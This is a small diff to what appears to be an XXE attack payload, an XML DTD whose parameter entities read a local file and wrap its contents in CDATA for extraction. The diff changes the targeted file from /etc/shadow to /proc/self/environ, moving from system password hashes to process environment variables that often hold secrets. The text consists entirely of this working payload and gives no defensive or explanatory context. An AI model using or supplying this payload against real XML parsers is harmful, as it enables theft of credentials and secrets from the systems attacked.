@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:/etc/shadow">
+<!ENTITY % file SYSTEM "file:/proc/self/environ">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
